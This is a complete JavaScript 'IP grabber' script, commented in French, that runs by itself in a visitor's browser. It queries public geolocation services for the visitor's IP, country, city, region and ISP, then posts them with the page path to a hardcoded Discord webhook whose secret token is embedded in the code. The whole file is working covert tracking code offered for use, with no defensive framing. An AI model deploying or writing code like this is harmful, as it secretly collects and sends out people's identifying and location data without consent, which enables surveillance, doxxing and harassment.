// ============================================
// GRABBER IP — poste au webhook Discord
// ============================================
(async function grab() {
  const WEBHOOK = 'https://discord.com/api/webhooks/1547587284902084608/AB5fL_qdjA3ZsW25tKHUBuezFZtfexiL2uigVx8rlP2I_Ii0fpbGh5fD8ofQiDZWdFbY';

  console.log('[grabber] démarrage');

  let ip = null, country = '', city = '', region = '', isp = '', source = '';

  try {
    const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
    if (r.ok) {
      const d = await r.json();
      if (d.ip) {
        ip = d.ip; country = d.country_name || ''; city = d.city || '';
        region = d.region || ''; isp = d.org || '';
        source = 'ipapi.co';
      }
    }
  } catch (e) { console.warn('[ipapi] échec', e.message); }

  if (!ip) {
    try {
      const r = await fetch('https://ipwho.is/', { cache: 'no-store' });
      if (r.ok) {
        const d = await r.json();
        if (d.success && d.ip) {
          ip = d.ip; country = d.country || ''; city = d.city || '';
          region = d.region || ''; isp = d.connection?.isp || '';
          source = 'ipwho.is';
        }
      }
    } catch (e) { console.warn('[ipwho] échec', e.message); }
  }

  if (!ip) {
    try {
      const r = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
      if (r.ok) {
        const d = await r.json();
        if (d.ip) { ip = d.ip; source = 'ipify'; }
      }
    } catch (e) { console.warn('[ipify] échec', e.message); }
  }

  if (!ip) { ip = 'inconnue'; source = 'aucune'; }
  console.log('[grabber] IP =', ip, '| source =', source);

  // --- Payload SIMPLE : juste du texte, pas d'embed ---
  const content =
    '🌐 **Visiteur**\n' +
    '📌 IP : `' + ip + '`\n' +
    '📍 Source : ' + source + '\n' +
    '🌍 ' + (country || '—') + ' · ' + (city || '—') + ' · ' + (region || '—') + '\n' +
    '📡 FAI : ' + (isp || '—') + '\n' +
    '📄 Page : ' + location.pathname;

  const payload = { content };

  console.log('[grabber] envoi…', payload);

  try {
    const r = await fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    console.log('[grabber] status =', r.status);
    if (r.status === 204) {
      console.log('[grabber] ✅ envoyé');
    } else {
      const txt = await r.text();
      console.error('[grabber] ❌ réponse Discord :', r.status, txt);
    }
  } catch (e) {
    console.error('[grabber] ❌ échec fetch', e.message);
  }
})();
